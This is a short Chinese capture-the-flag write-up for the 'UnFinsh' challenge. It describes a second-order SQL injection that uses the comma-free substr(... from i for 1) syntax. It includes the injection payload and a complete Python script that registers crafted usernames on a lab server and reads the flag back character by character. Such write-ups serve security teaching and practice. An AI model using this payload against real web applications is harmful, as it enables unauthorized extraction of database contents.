# UnFinsh

> sql二次注入

## substr

> 从一个内容中,按照指定条件,「截取」一个字符串.这个内容可以是数值或字符串.有2种语法模式

> substr(obj,start,length)

> substr(obj FROM start FOR length)

## 思路分析

> 打开网站是一个登陆页面,源码没信息,扫目录发现register.php,进行注册,登陆后发现是一张图片和显示用户名.题目要考察的就清楚了,是二次注入.有很多关键字被过滤了,最后fuzz,选择使用substr截取字符,逗号又被过滤,使用第二种语法模式.

## payload

> 0'+ascii(substr((select * from flag) from {i} for 1))+'0;

> 前面和后面进行0'+与+'0的是为了构造闭合,+0对值也不会有变化,

```
import requests
from time import sleep
from bs4 import BeautifulSoup
 
 
def flag():
    flag = ''
    url = 'http://61.147.171.105:53454/'
    register_url = url + 'register.php'
    login_url = url + 'login.php'
    for i in range(1, 100):
        sleep(0.5)
        register_data = {
            "email": f"aiwin{i}@163.com", 
            "username": f"0'+ascii(substr((select * from flag) from {i} for 1))+'0;", "password": "1"
        }
        login_data = {
            "email": f"aiwin{i}@163.com", 
            "password": "1"
        }
        requests.post(register_url, data = register_data)
        response_login = requests.post(login_url, data = login_data)
        bs = BeautifulSoup(response_login.text, 'html.parser')  # bs4解析页面
        username = bs.find('span', class_ = 'user-name')  # 取返回页面数据的span class=user-name属性
        number = username.text  # 取该属性的数字
        flag += chr(int(number))
        print(flag)
        if '}' in flag:
            break
 
 
if __name__ == '__main__':
    flag()
```

## flag

> flag{2494e4bf06734c39be2e1626f757ba4c}